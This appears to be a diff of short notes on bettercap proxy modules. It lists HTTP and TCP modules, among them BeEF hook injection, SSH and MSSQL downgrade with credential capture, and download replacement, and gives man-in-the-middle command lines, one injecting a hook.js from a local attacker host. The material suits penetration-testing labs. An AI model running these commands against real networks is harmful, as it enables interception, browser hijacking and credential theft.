@@ -1,8 +1,31 @@
 
 https://github.com/evilsocket/bettercap-proxy-modules
 
+HTTP(S) Proxy Modules
+========================
+
+http/beefbox.rb - Similar to injectjs but specialized to work with the BeEF framework.
+http/debug.rb - Debug HTTP requests and responses.
+http/simple_post.rb - Intercept and display only selected POST fields.
+http/location_hijacking.rb - Hijack Location header with custom URL.
+http/replace_images.rb - Replace all images with a custom one.
+http/rickroll.rb - Inject an iframe with the (in)famous RickRoll video in autoplay mode.
+http/hack_title.rb - Add a "HACKED" text to website titles.
+http/replace_file.rb - Replace downloaded files on the fly with custom ones.
+
+ bettercap -I eth0 -T target_ip  --proxy-module XXX.rb --proxy-module YYY.rb --proxy-module ZZZ.rb
+ 
  bettercap -I eth0 -T target_ip  --proxy-module injectjs --js-url "http://192.168.1.3:3000/hook.js"
  
  bettercap -I eth0 -T target_ip  --proxy-module hack_title.rb
  
  bettercap -I eth0 -T target_ip  --proxy-module replace_images.rb --http-path /root/pictures/
+ 
+ 
+ TCP Proxy Modules
+ =====================
+
+tcp/debug.rb - Simply hex-dumps all TCP traffic going through the proxy.
+tcp/sshdowngrade.rb - If possible, perform a SSH 2.x -> 1.x downgrade attack.
+tcp/mssqlauth.rb - Downgrades MSSQL encryption and capture login credentials.
+tcp/netsed.rb - NetSed like tcp proxy module. 
